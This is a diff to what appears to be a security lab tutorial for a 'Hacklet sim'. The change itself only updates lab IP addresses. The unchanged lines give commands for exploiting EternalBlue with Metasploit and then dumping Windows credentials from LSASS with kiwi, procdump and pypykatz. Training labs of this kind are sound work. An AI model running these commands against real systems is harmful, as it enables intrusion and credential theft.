@@ -356,7 +356,7 @@ If you want to dig deeper, search for: **dumpert**, **nanodump**,
 In the Hacklet sim, you can run all three methods end-to-end:
 
 1. `msfconsole` → `use exploit/windows/smb/ms17_010_eternalblue`
-2. `set RHOSTS 10.10.20.10` → `set LHOST 10.10.20.5` → `run`
+2. `set RHOSTS 10.10.10.10` → `set LHOST 10.10.10.5` → `run`
 3. **Method 1**: `load kiwi` → `creds_all`
 4. **Method 2**: `shell` → `procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp`
    → `exit` → `pypykatz lsa minidump /tmp/lsass.dmp` (back in Linux)
